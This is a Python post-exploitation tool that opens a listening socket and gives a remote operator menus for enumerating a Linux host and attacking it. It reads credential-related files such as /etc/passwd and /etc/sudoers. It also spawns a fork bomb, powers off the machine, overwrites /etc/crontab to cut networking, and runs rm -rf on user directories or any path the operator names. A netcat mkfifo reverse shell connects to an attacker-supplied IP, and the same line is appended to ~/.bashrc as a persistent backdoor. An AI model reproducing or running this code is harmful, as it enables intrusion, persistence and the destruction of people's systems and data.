#!/usr/bin/env python3

import socket, sys, os, string, random, time
import subprocess as subp


host = '0.0.0.0'
port = 0
results = []

# COLOURS
RED   = "\033[1;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
RED  = "\033[1;34m"
PURPLE = "\033[1;35m"
CYAN  = "\033[1;36m"
WHITE = "\033[0;37m"

RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

BG_RED = "\033[;41m"
BG_YELLOW = "\033[;43m"

whoami = "whoami"
out, err = subp.Popen(whoami, stdout= subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
me = str(out.decode())

def execute_cmd(cmd_dict):
	for i in cmd_dict:
		cmd = cmd_dict[i]["cmd"]
		out, error = subp.Popen([cmd], stdout=subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
		results = out.decode('utf-8').split('\n')
		cmd_dict[i]["results"]=results
	return cmd_dict

def send_result(cmd_dict,con):
	for i in cmd_dict:
		msg = cmd_dict[i]["msg"]
		results = cmd_dict[i]["results"]
		con.send(str(BOLD + CYAN + "[+] " + msg + "\n").encode())
		for result in results:
			if result != "" and "root" in result.split():
				con.send(str(BOLD + RED + " " + result.strip()).encode())
			elif result != "" and me.strip() in result.split():
				con.send(str(BOLD + PURPLE + " " + result.strip()).encode())
			elif result.strip('\n') != "":
				con.send(str(BOLD + WHITE + " " + result.strip()).encode())
			con.send(b'\n')
	con.send(str(RESET).encode())

def enum_basic_sysinfo(con):
	#System Information
	system_info = {
		"OS":{"cmd":"egrep '^(VERSION|NAME)=' /etc/os-release","msg":"Operating System","results":results},
		"KERNEL":{"cmd":"cat /proc/version","msg":"Kernel","results":results},
		"PATH":{"cmd":"echo $PATH", "msg":"Path Variable", "results":results}
	}

	system_info = execute_cmd(system_info)
	send_result(system_info,con)

	return system_info

def enum_users(con):
	user_info = {
		"WHOAMI":{"cmd":"id || (whoami && groups) 2>/dev/null", "msg":"Who Am I?", "results":results},
		"ALL_USERS":{"cmd":"cat /etc/passwd | cut -d: -f1", "msg":"All Users", "results":results},
		"SUDOERS": {"cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null", "msg": "Sudoers (privileged)", "results": results},
		"SUPERUSERS":{"cmd":"awk -F: '($3 == '0') {print}' /etc/passwd 2>/dev/null", "msg":"Superusers", "results":results},
		"CURRENT_LOGGED_IN":{"cmd":"w 2>/dev/null", "msg":"Currently Logged In Users", "results":results}
	}

	user_info = execute_cmd(user_info)
	send_result(user_info,con)

	return user_info

def enum_network(con):
	network_info = {
		"HOSTNAME":{"cmd":"cat /etc/hostname", "msg":"Hostname", "results":results},
		"HOSTS":{"cmd":"cat /etc/hosts /etc/resolv.conf", "msg":"Hosts", "results":results},
		"DNS":{"cmd":"dnsdomainname", "msg":"DNS Domain Name", "results":results},
		"NETWORKS":{"cmd":"cat /etc/networks", "msg":"Existing Networks", "results":results},
		"INTERFACES":{"cmd":"ifconfig || ip a", "msg":"Interfaces", "results":results},
		"ARP":{"cmd":"arp -e || arp -a", "msg":"ARP Table","results":results},
		"ROUTE":{"cmd":"route || ip n", "msg":"Routing Table","results":results},
		"NETSTAT":{"cmd":"netstat -atulpn | grep -v 'TIME_WAIT'","msg":"Netstat","results":results},
		"OPEN_PORTS":{"cmd":"netstat -punta || ss --ntpu | grep '127.0'", "msg":"Open Ports", "results":results}
	}

	network_info = execute_cmd(network_info)
	send_result(network_info,con)

def enum_proc_serv(con):
	proc_serv = {
		"CURRENT_USER_CRONJOB":{"cmd":"crontab -l", "msg":"CRONJOBS FOR CURRENT USER", "results":results},
		"ALL_CRONJOBS":{"cmd":"ls -al /etc/cron* /etc/at*", "msg":"ALL CRONJOBS", "results":results},
		"SERVICES":{"cmd":"systemctl list-units --type=service > systemctll && cat systemctll && rm systemctll ", "msg":"ALL SERVICES", "results":results},
		"PROCESSES":{"cmd":"ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg":"Running Processes", "results": results},
	}

	proc_serv = execute_cmd(proc_serv)
	send_result(proc_serv,con)

def enum_proc_app(con):
	uname = "uname -a"
	out, err = subp.Popen(uname, stdout= subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
	if "Debian" or "Ubuntu" in out.decode():
		get_packagemng = "dpkg -l | awk '{$1=$4=\"\"; print $0}'" #Debian Package Manager
	else:
		get_packagemng = "rpm -qa | sort -u" #Red Hat Linux Package Manager

	proc_app = {
		"USEFUL BINARIES":{"cmd":"which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null", "msg":"Useful Binaries in the System","results":results},
		"COMPILERS":{"cmd":"dpkg --list 2>/dev/null | grep 'compiler' || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; command -v gcc g++ 2>/dev/null || locate -r '/gcc[0-9\.-]\+$' 2>/dev/null | grep -v '/doc/'')","msg":"Installed Compilers","results":results},
		"ALL PACKAGES":{"cmd":get_packagemng, "msg":"Installed Packages", "results": results}
	}

	proc_app = execute_cmd(proc_app)
	send_result(proc_app,con)



def enum_filesystem(con):
	filesystem_info = {
		"PARTITIONS":{"cmd":"df -h","msg":"Hard Drive Partitions","results":results},
		"MOUNTED DEVICES":{"cmd":"cat /etc/mtab","msg":"Mounted Devices","results":results},
		"FSTAB":{"cmd":"cat /etc/fstab 2>/dev/null","msg":"File System Table","results":results}
	}

	filesystem_info = execute_cmd(filesystem_info)
	send_result(filesystem_info,con)

	return filesystem_info

###############################
# DISRUPTIONS / SEVERE ATTACK #
###############################

def spam_file(con):
	con.send(b'Only spawning 10 files for demonstration purposes!')
	# while True:
	for i in range (0,10):
		letters = string.ascii_letters
		os.system("cd /dev/shm; echo " + str(''.join(random.choice(letters) for i in range(1024))) + " > hacked" + str(''.join(random.choice(letters) for i in range(10))))
	con.send(b'Done!')

def plant_bomb(con):
	con.send(b'Planting fork bomb. This will crash the target system!')
	os.fork()
	con.send(b'Done!')

def shutdown(con):
	con.send(b'Shutting down target system.')
	os.system("poweroff")
	con.send(b'Done')

def kill_process(con):
	con.send(b'Enter PID you want to kill: ')
	pid = con.recv(1024)
	try:
		pid = pid.decode()
		os.system("kill -9 " + str(pid))
	except ValueError:
		con.sendall(b'Only integers are allowed here!\n')
	except KeyboardInterrupt:
		sys.exit(0)

def disable_networking(con):
	con.send(b'Disabling Networking on Victim Machine. Disconnecting now...')
	os.system("echo /dev/shm/disablenetworking.sh' > /dev/shm/disablenetworking.sh")
	os.system("echo '* 12 * * * " + me.strip() + " /dev/shm/disablenetworking.sh' > /etc/crontab")
	os.system("nmcli networking off")

def delete_files(con):
	con.send(b'Which directory do you want emptied?\n1. User Desktop\n2. User Documents\n3. User Downloads\n.Entire User Directory')
	directory = con.recv(1024)
	try:
		directory = directory.decode()
		directory = int(directory)
		if(directory == 1):
			target_dir = "/home/" + me.strip() + "/Music/*"
		elif(directory == 2):
			target_dir = "/home/" + me.strip() + "/Music/*"
		elif(directory == 3):
			target_dir = "/home/" + me.strip() + "/Music/*"
		elif(directory == 4):
			target_dir = "/home/" + me.strip() +"/*"
		elif(directory == 5):
			con.send(b'Please specify the full directory:')
			fulldir = con.recv(2048)
			target_dir = str(fulldir.strip())
	except ValueError:
		con.send(b'Please send a valid input!')

	msg = "Emptying " + target_dir + " now. Bye-bye!"
	con.send(msg.encode())

	# SEVERE ATTACK
	# os.system("while :; do rm -rf " + target_dir + "; sleep 5 & done")
	os.system("for i in {1...2}; do rm -rf " + target_dir + "; sleep 5 & done")

def reverse_shell(con):
	con.send(b'Enter your IP address: ')
	attacker_ip = con.recv(1024)
	con.send(b'Enter your listening port for shell drop: ')
	attacker_port = con.recv(1024)

	attacker_ip = str(attacker_ip.decode().strip())
	attacker_port = str(attacker_port.decode().strip())

	cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + attacker_ip + " " + attacker_port + " >/tmp/f &"
	os.system(cmd)

	con.send(b'Reverse Shell spawned! Check your other terminal.')

def plant_backdoor(con):
	con.send(b'Enter your IP address: ')
	attacker_ip = con.recv(1024)
	con.send(b'Enter your listening port for shell drop: ')
	attacker_port = con.recv(1024)

	attacker_ip = str(attacker_ip.decode().strip())
	attacker_port = str(attacker_port.decode().strip())

	cmd = "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + attacker_ip + " " + attacker_port + " >/tmp/f &' >> ~/.bashrc"
	os.system(cmd)

	con.send(b'Backdoor has been planted. The shell will pop next time user opens a terminal window.')


#####################
# MENU STUFF & MISC #
#####################
def banner(con):
	line = BOLD + RED + "====================================================================="

	banner1 = BOLD + RED + "                      __ " + BOLD + CYAN + "              " + BOLD + YELLOW + "  ___        " + "\n"
	banner2 = BOLD + RED + "    ____  ____  _____/ /_"+ BOLD + CYAN + "___  _  ______ " + BOLD + YELLOW +"|__ \ __  __" + "\n"
	banner3 = BOLD + RED + "   / __ \/ __ \/ ___/ __/"+ BOLD + CYAN + " _ \| |/_/ __ \\" + BOLD + YELLOW + "__/ // / / /" + "\n"
	banner4 = BOLD + RED + "  / /_/ / /_/ (__  ) /_"+ BOLD + CYAN + "/  __/>  </ /_/ /" + BOLD + YELLOW +" __// /_/ /" + "\n"
	banner5 = BOLD + RED + " / .___/\____/____/\__/"+ BOLD + CYAN + "\___/_/|_/ .___/" + BOLD + YELLOW +"____/\__,_/" + "\n"
	banner6 = BOLD + RED + "/_/                   "+ BOLD + CYAN + "         /_/                  " + "\n"

	con.sendall(banner1.encode())
	con.sendall(banner2.encode())
	con.sendall(banner3.encode())
	con.sendall(banner4.encode())
	con.sendall(banner5.encode())
	con.sendall(banner6.encode())

def exploit_menu(con):
	con.sendall((BOLD + CYAN).encode())
	exploit_menu = b'\nExploit Menu\n1. Spam File\n2. Plant Fork Bomb\n3. Shut Down System\n4. Kill Process\n5. Disable Networking\n6. Delete User Files\n7. Drop Reverse Shell\n8. Plant Backdoor\n9. Return to Main Menu'
	con.sendall(exploit_menu)
	con.sendall(b'\nYour Selection: ')
	choice = con.recv(1024)
	if not choice:
		exploit_menu(con)
	else:
		try:
			choice = choice.decode()
			choice = int(choice)
			if(choice == 1):
				spam_file(con)
			elif(choice == 2):
				plant_bomb(con)
			elif(choice == 3):
				shutdown(con)
			elif(choice == 4):
				kill_process(con)
			elif(choice == 5):
				disable_networking(con)
			elif(choice == 6):
				delete_files(con)
			elif(choice == 7):
				reverse_shell(con)
			elif(choice == 8):
				plant_backdoor(con)
			elif(choice == 9):
				menu(con)
			else:
				con.sendall(b'How did we get here?')
		except ValueError:
			con.sendall(b'Only type integer is allowed here!\n')
		except KeyboardInterrupt:
			sys.exit(0)

def enum_menu(con):
	con.send(((BOLD + CYAN)).encode())
	main_menu = b'\nEnumeration Menu\n1. Basic System Information\n2. User Information\n3. Network Information\n4. Processes & Services\n5. Applications\n6. File System Information\n9. Return to Main Menu'
	con.sendall(main_menu)
	con.sendall(b'\nYour Selection: ')
	choice = con.recv(1024)
	if not choice:
		enum_menu(con)
	else:
		try:
			choice = choice.decode()
			choice = int(choice)
			if(choice == 1):
				enum_basic_sysinfo(con)
			elif(choice == 2):
				enum_users(con)
			elif(choice == 3):
				enum_network(con)
			elif(choice == 4):
				enum_proc_serv(con)
			elif(choice == 5):
				enum_proc_app(con)
			elif(choice == 6):
				enum_filesystem(con)
			elif(choice == 9):
				menu(con)
			else:
				con.sendall(b'How did we get here?')
		except ValueError:
			con.sendall(b'Only type integer is allowed here!\n')
		except KeyboardInterrupt:
			sys.exit(0)

def menu(con):
	banner(con)
	main_menu = b'\n\nMain Menu\n1. Enumeration Menu\n2. Exploit Menu\n0. Exit Program'
	con.sendall(main_menu)
	con.sendall(b'\n> ')
	choice = con.recv(1024)
	if not choice:
		enum_menu(con)
	else:
		try:
			choice = choice.decode()
			choice = int(choice)
			if(choice == 1):
				enum_menu(con)
				# con.sendall(b'Basic System Information')
			elif(choice == 2):
				exploit_menu(con)
			elif(choice == 0):
				sys.exit(0)
			else:
				con.sendall(b'Invalid Choice.')
		except ValueError:
			con.sendall(b'Only type integer is allowed here!\n')
		except KeyboardInterrupt:
			sys.exit(0)


def main():
	with socket.socket() as sock:
		try:
			sock.bind((host, port))
			sock.listen()
			conn, addr = sock.accept()
			with conn:
				print("Connection from: ",addr)
				while True:
					menu(conn)
		except KeyboardInterrupt:
			print("Error: Keyboard Interrupt")
		# except:
		# 	print("Failed to bind socket.")
		# 	sys.exit(0)

if __name__ == "__main__":
	# try:
	# 	port = input("Enter port number to bind: ")
	# except ValueError:
	# 	print("Must be integer!")

	port = 9001

	while True:
		main()
